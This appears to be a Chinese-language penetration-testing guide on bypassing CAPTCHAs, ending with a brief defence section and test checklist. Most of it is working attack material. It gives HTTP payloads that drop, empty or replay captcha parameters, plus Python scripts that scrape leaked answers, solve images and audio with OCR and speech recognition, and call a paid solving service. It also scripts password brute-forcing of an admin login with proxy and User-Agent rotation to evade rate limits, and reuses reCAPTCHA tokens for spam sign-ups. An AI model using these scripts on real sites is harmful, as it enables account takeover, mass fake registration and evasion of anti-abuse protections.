---
attack_surface: [认证/授权绕过, 客户端利用, 配置缺陷]
impact: [身份伪造, 完整性破坏, 可用性破坏]
risk_level: 高
prerequisites:
  - HTTP 协议基础
  - Burp Suite / 拦截代理操作
  - 基础 Python 脚本能力
related_techniques:
  - rate-limit-bypass
  - 2fa-otp-bypass
  - business-logic-flaws
  - race-condition
difficulty: 中级
tools:
  - Burp Suite
  - Tesseract OCR
  - CapSolver / 2Captcha
  - Python (requests / Pillow / pytesseract)
---

# Captcha Bypass — 验证码绕过全指南

> 关联文档：[Rate Limit Bypass](../Rate%20Limit%20Bypass/README.md) · [2FA/OTP Bypass](../2FA-OTP%20Bypass/README.md) · [Business Logic](../Business%20Logic/README.md) · [Race Condition](../Race%20Condition/README.md)

---

# 0x01 背景与原理

## 1.0 TL;DR

验证码（CAPTCHA — Completely Automated Public Turing test to tell Computers and Humans Apart）的设计目标是区分人类用户和自动化程序。但实现缺陷使其可以被绕过——从简单的参数操纵到成熟的 ML 图像识别，攻击面远比表面看起来宽广。

## 1.1 根本原理

验证码的安全模型基于一个核心假设：**只有人类能通过这个测试**。但这个假设在以下情况下失效：

1. **验证在客户端完成** — 服务端信任客户端返回的"验证通过"信号，攻击者可直接伪造
2. **验证码答案泄露** — 答案出现在页面源码、Cookie、API 响应中
3. **验证码集合有限** — 图片验证码的总数量很小（< 1000 张），可穷举建立映射表
4. **验证码生成可预测** — 基于时间戳或简单算法的生成可被逆向
5. **验证码绕过逻辑缺陷** — 参数缺失时空字符串绕过、旧值重用、Session 未绑定
6. **ML 模型超越验证码设计** — 现代 OCR 和深度学习模型的识别率已超过多数简单验证码的设计阈值

## 1.2 验证码类型与攻击面总览

| 验证码类型 | 核心弱点 | 绕过方法 | 成功率 |
|-----------|---------|---------|--------|
| 数学计算 | 可自动化计算 | 正则提取 + eval | 100% |
| 文本图片（简单） | OCR 可识别 | Tesseract / pytesseract | 70-95% |
| 文本图片（扭曲/噪声） | 有限字符集 | 预处理 + CNN 模型 | 50-80% |
| 滑动拼图 | 客户端验证 | JS 逆向 + 伪造验证参数 | 60-90% |
| 点击识别 | 图片集合有限 | MD5 哈希映射 + 坐标枚举 | 70-90% |
| Google reCAPTCHA v2 | 音频回退 + 第三方服务 | 语音识别 + CapSolver | 60-90% |
| Google reCAPTCHA v3 | 仅返回评分 | 直接使用返回的 token（无额外验证） | 80-100% |
| Cloudflare Turnstile | JS 环境检测 | 真实浏览器 + 人工介入 | 40-70% |
| 短信/邮件验证码 | 可枚举/重放/泄露 | 暴力枚举 + 响应差异 | 30-70% |

## 1.3 攻击面分类

- 攻击面：认证/授权绕过、客户端利用、配置缺陷
- 影响维度：身份伪造（自动化批量注册/登录）、完整性破坏（绕过人为操作限制）、可用性破坏（资源滥用）
- 风险等级：**高** — 可自动化、批量利用、直接导致反自动化保护失效

---

# 0x02 入口点检测 — 验证码交互审计

## 2.1 验证码生命周期分析

正常验证码验证流程：

```
[服务端生成验证码] → [发送给客户端（图片/问题/token）] → [用户解答] → [客户端提交答案] → [服务端验证]
     ↑                     ↑                                ↑                ↑                   ↑
   生成逻辑               传输信道                         解答过程          请求参数             验证逻辑
```

每一步都可能存在缺陷。测试时按以下顺序审计：

1. **生成阶段**：验证码的答案是如何生成的？是否可预测？
2. **传输阶段**：答案是否出现在 HTTP 响应中（页面源码/Cookie/Header）？
3. **解答阶段**：是否可以在客户端绕过解答（如数学验证码的 eval）？
4. **提交阶段**：提交参数是否可被篡改、删除或重用？
5. **验证阶段**：服务端验证逻辑是否存在短路缺陷？

## 2.2 请求特征识别

拦截包含验证码的请求，关注以下参数模式：

```
POST /login HTTP/1.1
Host: target.com

username=admin&password=xxx&captcha=ABCDE&captcha_id=sess_12345
                                   ↑                  ↑
                              用户输入的答案        验证码标识符
```

关键参数名称（因应用而异）：
- `captcha`, `captcha_code`, `captcha_value`, `captcha_answer`
- `g-recaptcha-response`（Google reCAPTCHA）
- `h-captcha-response`（hCaptcha）
- `cf-turnstile-response`（Cloudflare Turnstile）
- `captcha_id`, `captcha_token`, `captcha_key`, `captcha_sid`

---

# 0x03 参数操纵 — 不破解验证码的绕过

## 3.1 移除验证码参数

### 原理

某些服务端在未收到验证码参数时，跳过验证逻辑（而非拒绝请求）。这是最直接的绕过方式。

### Payload

```http
# 原始请求
POST /register HTTP/1.1
Host: target.com

username=test&password=test123&captcha=ABCDE&captcha_id=12345

# 攻击：移除 captcha 参数
POST /register HTTP/1.1
Host: target.com

username=test&password=test123&captcha_id=12345
```

```http
# 攻击：移除整个验证码相关参数组
POST /register HTTP/1.1
Host: target.com

username=test&password=test123
```

### 变换 HTTP 方法与数据格式

```http
# 原始（POST + form-data）
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=test&password=test123&captcha=ABCDE

# 攻击：切换为 GET
GET /register?username=test&password=test123 HTTP/1.1

# 攻击：切换为 PUT
PUT /register HTTP/1.1
Content-Type: application/json

{"username":"test","password":"test123"}

# 攻击：切换 Content-Type
POST /register HTTP/1.1
Content-Type: application/json

{"username":"test","password":"test123"}
```

## 3.2 空验证码绕过

### 原理

服务端验证逻辑 `if (user_captcha != null && user_captcha != correct_value)` 在没有验证码时跳过检查。空字符串触发代码逻辑短路。

### Payload

```http
POST /login HTTP/1.1
Host: target.com

username=admin&password=xxx&captcha=
# captcha 参数存在但值为空
```

```json
# JSON body 变体
{"username":"admin","password":"xxx","captcha":""}
{"username":"admin","password":"xxx","captcha":null}
{"username":"admin","password":"xxx","captcha":false}
{"username":"admin","password":"xxx","captcha":[]}
```

## 3.3 旧验证码值重用

### 原理

服务端未正确标记已使用的验证码为失效状态，同一答案可多次使用（同一 Session 或跨 Session）。

### Payload

```http
# Step 1: 正常获取验证码，记录 captcha_id 和答案
GET /captcha/generate HTTP/1.1
# 响应: captcha_id=abc123, 图片显示答案 = "XK9M2"

# Step 2: 第一次使用（正常）
POST /login HTTP/1.1
username=user1&password=pass1&captcha=XK9M2&captcha_id=abc123

# Step 3: 重放 — 同一 captcha_id 和答案
POST /login HTTP/1.1
username=user2&password=pass2&captcha=XK9M2&captcha_id=abc123

# Step 4: 跨 Session 重放
POST /login HTTP/1.1
Cookie: session=NEW_SESSION_ID
username=user3&password=pass3&captcha=XK9M2&captcha_id=abc123
```

## 3.4 Session 操纵

### 原理

验证码与 Session 的绑定存在缺陷：
- 验证码未绑定 Session — 同一 captcha_id 可在任意 Session 中使用
- Session 可被复用 — 同一个 Session ID 中的验证码在首次通过后不清除

### Payload

```http
# 跨 Session 复用 — 攻击者获取 captcha_id，在受害者 Session 中提交
POST /password-reset HTTP/1.1
Cookie: session=VICTIM_SESSION
captcha=KNOWN_ANSWER&captcha_id=ATTACKER_CAPTCHA_ID
```

```http
# Session 固定 + 验证码 — 攻击者完成验证，受害者 Session 获得"已通过验证码"标记
1. 攻击者登录 → 完成验证码 → 获得 Session Token
2. 将受害者的 Session Token 替换为攻击者的
3. 受害者操作不再需要验证码
```

---

# 0x04 值提取与重用 — 从应用自身获取答案

## 4.1 页面源码中搜索答案

### 原理

验证码的答案被嵌入 HTML 源码中（hidden input、注释、JavaScript 变量、meta 标签），攻击者可直接读取。

### Payload

```html
<!-- 常见泄露位置 -->
<!-- 1. Hidden Input -->
<input type="hidden" name="captcha_answer" value="XK9M2">

<!-- 2. JavaScript 变量 -->
<script>var captcha_code = "XK9M2";</script>

<!-- 3. HTML 注释 -->
<!-- captcha: XK9M2 -->

<!-- 4. Meta 标签 -->
<meta name="captcha-token" content="XK9M2">

<!-- 5. Data 属性 -->
<div id="captcha-widget" data-code="XK9M2">
```

### 自动化提取

```bash
# 从页面提取可能的验证码值
curl -s "https://target.com/register" | grep -iP 'captcha[= "\047]+[A-Za-z0-9]{4,8}'
```

```python
import re
import requests

resp = requests.get("https://target.com/register")
# 常见泄露模式
patterns = [
    r'name="captcha_answer"\s+value="([^"]+)"',
    r'var\s+captcha\s*=\s*["\']([^"\']+)["\']',
    r'<!--\s*captcha:\s*(\S+)\s*-->',
    r'data-code="([^"]+)"',
]
for p in patterns:
    match = re.search(p, resp.text)
    if match:
        print(f"Found: {match.group(1)}")
```

## 4.2 Cookie 中提取答案

### 原理

验证码答案被存储在客户端 Cookie 中，可能是明文或简单编码。

### Payload

```http
# 响应 Set-Cookie
HTTP/1.1 200 OK
Set-Cookie: captcha_value=XK9M2; Path=/
Set-Cookie: captcha_hash=7e8d3f2a1b4c; Path=/
Set-Cookie: captcha_plain=ab1cd2; Path=/     # ← 明文答案
Set-Cookie: captcha=btoa("XK9M2"); Path=/    # ← base64 编码
```

```python
import base64
import requests

resp = requests.get("https://target.com/captcha")
for cookie in resp.cookies:
    if 'captcha' in cookie.name.lower():
        print(f"{cookie.name} = {cookie.value}")
        # 尝试 base64 解码
        try:
            decoded = base64.b64decode(cookie.value).decode()
            print(f"  base64 decoded: {decoded}")
        except:
            pass
```

## 4.3 API 响应中泄露

### 原理

验证码生成的 API 端点在返回图片的同时，也在响应体中返回了答案（JSON 字段、响应头）。

```http
# 验证码生成 API 响应
GET /api/captcha/generate HTTP/1.1

HTTP/1.1 200 OK
Content-Type: application/json

{
  "captcha_id": "abc123",
  "captcha_image": "data:image/png;base64,iVBOR...",
  "captcha_answer": "XK9M2"      # ← 答案直接返回
}
```

---

# 0x05 自动化识别 — 图像/音频验证码破解

## 5.1 数学验证码自动化

### 原理

数学验证码（如 "3 + 7 = ?"）本质上是对自动化程序最友好的验证码——计算机能够且应该能解出数学题。

### Python 自动化

```python
import re
import requests

# Step 1: 获取验证码文本
resp = requests.get("https://target.com/captcha/math")
text = resp.json().get("question", "")  # e.g. "What is 15 + 7?"

# Step 2: 提取并计算
match = re.search(r'(\d+)\s*([+\-*/])\s*(\d+)', text)
if match:
    a, op, b = int(match.group(1)), match.group(2), int(match.group(3))
    ops = {'+': lambda x, y: x + y, '-': lambda x, y: x - y,
           '*': lambda x, y: x * y, '/': lambda x, y: x // y}
    answer = ops[op](a, b)
    
    # Step 3: 提交
    requests.post("https://target.com/login",
                  data={"username": "admin", "password": "xxx",
                        "captcha": str(answer)})
```

## 5.2 OCR 识别（Tesseract）

### 原理

[Tesseract OCR](https://github.com/tesseract-ocr/tesseract) 是 Google 维护的开源 OCR 引擎，对于无扭曲、无复杂背景的文本验证码具有较高的识别率。

### 基本用法

```bash
# 识别验证码图片
tesseract captcha.png stdout -l eng --psm 7
# --psm 7: 将图片视为单行文本
# --psm 8: 将图片视为单个单词
```

### Python 自动化 + 预处理

```python
import requests
import pytesseract
from PIL import Image, ImageFilter
from io import BytesIO

# Step 1: 下载验证码图片
resp = requests.get("https://target.com/captcha/image")
img = Image.open(BytesIO(resp.content))

# Step 2: 预处理提高识别率
img = img.convert("L")                    # 灰度化
img = img.point(lambda x: 0 if x < 128 else 255)  # 二值化
img = img.filter(ImageFilter.MedianFilter(3))      # 去噪

# Step 3: OCR 识别
text = pytesseract.image_to_string(img, config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
answer = text.strip()

# Step 4: 提交
requests.post("https://target.com/login",
              data={"captcha": answer})
```

## 5.3 MD5 哈希映射（有限集合攻击）

### 原理

如果验证码的总集合很小（< 1000 个不同图片），可以：
1. 反复请求验证码直到收集到所有唯一图片
2. 人工识别每张图片的答案
3. 建立 `MD5(image) → answer` 映射表
4. 之后遇到任意验证码，计算 MD5 直接查表获取答案

### Python 实现

```python
import hashlib
import requests
from collections import defaultdict

mapping = {}  # {md5_hash: answer}

def collect_and_map(requests_count=500):
    """收集验证码图片并建立 MD5 映射"""
    seen = set()
    for _ in range(requests_count):
        resp = requests.get("https://target.com/captcha/image")
        img_hash = hashlib.md5(resp.content).hexdigest()
        if img_hash not in seen:
            seen.add(img_hash)
            # 保存图片供人工标注
            with open(f"captchas/{img_hash}.png", "wb") as f:
                f.write(resp.content)
            mapping[img_hash] = None  # 待标注
    print(f"Unique images: {len(seen)}")

def solve_captcha(image_bytes):
    """查表获取验证码答案"""
    img_hash = hashlib.md5(image_bytes).hexdigest()
    return mapping.get(img_hash)
```

## 5.4 音频验证码识别

### 原理

大多数图形验证码提供"切换到音频"的无障碍选项，而音频验证码通常没有视觉扭曲，更容易被语音识别（STT）引擎破解。

### 攻击流程

```python
import requests
import speech_recognition as sr

# Step 1: 下载音频验证码
resp = requests.get("https://target.com/captcha/audio")

# Step 2: 语音识别
recognizer = sr.Recognizer()
with sr.AudioFile(BytesIO(resp.content)) as source:
    audio = recognizer.record(source)
    answer = recognizer.recognize_google(audio)  # 或 recognize_sphinx()
    # 清理结果（移除空格、"and"等）
    answer = answer.replace(" ", "").upper()

# Step 3: 提交
requests.post("https://target.com/login",
              data={"captcha": answer})
```

---

# 0x06 第三方求解服务 — 高级验证码的工业化破解

## 6.1 服务对比

| 服务 | reCAPTCHA v2 | reCAPTCHA v3 | hCaptcha | Funcaptcha | 平均延迟 | 价格 |
|------|:---:|:---:|:---:|:---:|------|------|
| CapSolver | ✓ | ✓ | ✓ | ✓ | 1-5s | $0.8-2/1000 |
| 2Captcha | ✓ | ✓ | ✓ | ✓ | 15-45s | $0.5-2.99/1000 |
| Anti-Captcha | ✓ | ✓ | ✓ | ✓ | 10-30s | $1-2/1000 |
| DeathByCaptcha | ✓ | ✓ | ✓ | ✗ | 5-15s | $1.39/1000 |

## 6.2 CapSolver API 集成示例

[CapSolver](https://www.capsolver.com/) 是 AI 驱动的验证码求解服务，支持 reCAPTCHA V2/V3、DataDome、AWS Captcha、Geetest、Cloudflare Turnstile 等。

```python
import requests
import time

API_KEY = "your-api-key"

# Step 1: 创建任务
task = requests.post("https://api.capsolver.com/createTask", json={
    "clientKey": API_KEY,
    "task": {
        "type": "ReCaptchaV2TaskProxyLess",
        "websiteURL": "https://target.com/login",
        "websiteKey": "6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-",
    }
}).json()

task_id = task["taskId"]

# Step 2: 轮询结果
for _ in range(30):
    time.sleep(2)
    result = requests.post("https://api.capsolver.com/getTaskResult", json={
        "clientKey": API_KEY,
        "taskId": task_id
    }).json()
    if result["status"] == "ready":
        token = result["solution"]["gRecaptchaResponse"]
        break

# Step 3: 使用 token 提交
requests.post("https://target.com/login", data={
    "username": "admin",
    "password": "xxx",
    "g-recaptcha-response": token
})
```

## 6.3 浏览器扩展方案

对于需要人工辅助的场景，浏览器扩展提供一键求解：
- [CapSolver Chrome 扩展](https://chromewebstore.google.com/detail/captcha-solver-auto-captc/pgojnojmmhpofjgdmaebadhbocahppod)
- [CapSolver Firefox 扩展](https://addons.mozilla.org/es/firefox/addon/capsolver-captcha-solver/)

---

# 0x07 环境对抗 — 绕过行为检测

## 7.1 Rate Limit 测试与绕过

### 原理

验证码通常在多次失败后触发。如果能在验证码触发阈值以下进行攻击，或重置计数，即可避免验证码。

### 策略

```python
import time
import random
import requests

# 慢速爆破 — 始终在触发验证码的阈值以下
for password in password_list:
    resp = requests.post("https://target.com/login",
                         data={"username": "admin", "password": password})
    if "captcha" not in resp.text.lower():
        # 未触发验证码，继续
        pass
    else:
        # 触发验证码，等待冷却期或换 IP
        time.sleep(random.uniform(30, 60))
```

```python
# 请求计数重置 — 在达到阈值前重置 Session/Cookie
session = requests.Session()
for i, password in enumerate(password_list):
    if i % 3 == 0:  # 每 3 次重置 Session（阈值为 5）
        session = requests.Session()
    resp = session.post("https://target.com/login",
                        data={"username": "admin", "password": password})
```

## 7.2 Session 与 IP 轮换

```python
import requests
from itertools import cycle

# IP 代理池
proxies = cycle([
    "http://proxy1:8080",
    "http://proxy2:8080",
    "http://proxy3:8080",
])

# User-Agent 池
user_agents = cycle([
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
])

for password in password_list:
    session = requests.Session()
    session.proxies = {"http": next(proxies), "https": next(proxies)}
    session.headers.update({"User-Agent": next(user_agents)})
    
    resp = session.post("https://target.com/login",
                        data={"username": "admin", "password": password})
```

## 7.3 Header 操纵 — 模拟不同客户端

```http
# 移动端 API 可能不需要验证码
POST /api/v2/login HTTP/1.1
User-Agent: AndroidApp/3.2.1 (com.target.app)

# 旧版 API 可能缺少验证码保护
POST /api/v1/login HTTP/1.1
User-Agent: TargetApp/1.0

# 伪装移动浏览器
POST /login HTTP/1.1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X)
```

---

# 0x08 特定平台验证码绕过

## 8.1 Google reCAPTCHA v3 绕过

### 原理

reCAPTCHA v3 不显示挑战，仅在后台返回一个 0.0-1.0 的评分。它返回的 token 与 v2 格式相同，但服务端**可能**仅验证 token 格式有效性而不检查评分阈值。

```python
# reCAPTCHA v3 返回的 token 有时可直接重用
token = "03AIIukziYxJKTvLvZ1Hm8X..."  # 从一次正常访问中获取
# 在不同请求中重用同一 token
requests.post("https://target.com/register",
              data={"email": "spam@evil.com", "g-recaptcha-response": token})
```

### 低评分通过

部分站点未正确设置评分阈值（默认 0.5），或者在开发环境关闭了阈值检查但在生产环境中未重新启用。

## 8.2 滑动验证码 JS 逆向

### 原理

滑动验证码的验证逻辑主要在客户端 JS 中执行。核心参数（滑动距离、轨迹数据）可以被伪造。

```javascript
// 常见验证参数
{
  "x": 245,           // 滑动距离 → 从 CSS/Canvas 中计算
  "trajectory": [     // 鼠标轨迹
    [0, 0, 100],      // [x, y, timestamp]
    [5, 0, 120],
    ...
  ],
  "duration": 1500    // 滑动耗时
}
```

通过逆向 JS 找到拼接逻辑后，可直接构造这些参数绕过滑动交互。

---

# 0x09 防御策略

## 9.1 服务端验证原则

| 错误做法 | 正确做法 |
|---------|---------|
| 接受客户端的 `captcha=success` 标记 | 服务端独立验证答案 |
| 验证码答案存储在 Cookie 中 | 答案仅存储在服务端 Session/Redis |
| 验证通过后不清除验证码状态 | 验证通过后立即标记为已使用 |
| 空答案跳过验证 | 空答案视为验证失败 |
| 同一 captcha_id 可多次使用 | 一次性使用，用完即删 |

## 9.2 关键防御措施

1. **答案绝不离开服务端** — 验证码答案存储在服务端（Session/Redis），不在 HTTP 响应中泄露
2. **一次性使用** — 每个验证码仅可提交一次，验证通过/失败后立即失效
3. **Session 绑定** — 验证码严格绑定到生成时的 Session，跨 Session 不可用
4. **TTL 限制** — 验证码有效期 3-5 分钟，超时自动过期
5. **参数完整性校验** — 缺失 `captcha` 参数返回错误，不允许空值绕过
6. **数字验证码 + 扭曲** — 使用足够大的随机字符集 + 变形 + 背景噪声，对抗 OCR
7. **行为分析** — 结合鼠标轨迹分析、按键时间间隔等行为特征，对抗自动化提交
8. **渐进式限制** — 失败 N 次后引入验证码、2N 次后临时封禁 IP、3N 次后锁定账户
9. **音频验证码保护** — 音频验证码使用与图形验证码相同的安全标准（噪声、有限有效期）

## 9.3 安全测试清单

- [ ] 移除 `captcha` 参数是否可绕过验证？
- [ ] 空字符串（`captcha=`）是否被接受？
- [ ] 同一 captcha_id 和答案是否可以重复使用？
- [ ] 答案是否出现在 HTML 源码/JS 变量/Cookie/API 响应中？
- [ ] 切换到 GET/JSON/PUT 请求是否绕过验证码检查？
- [ ] 旧版 API（`/api/v1/`）是否有验证码保护？
- [ ] 移动端 User-Agent 是否跳过验证码？
- [ ] reCAPTCHA token 是否可以跨请求重用？
- [ ] 验证码图片集合是否有限（< 500 张唯一图）？
- [ ] 是否有音频验证码回退且更易识别？
- [ ] 数学验证码是否可被正则提取和计算？
- [ ] 失败计数是否可通过 Session 重置来清除？

---

## 参考资料

- [HackTricks — Captcha Bypass](https://book.hacktricks.wiki/en/pentesting-web/captcha-bypass.html)
- [Tesseract OCR](https://github.com/tesseract-ocr/tesseract)
- [CapSolver — Captcha Solving Service](https://www.capsolver.com/)
- [CapSolver API Documentation](https://docs.capsolver.com/)
- [OWASP — Blocking Brute Force Attacks](https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks)
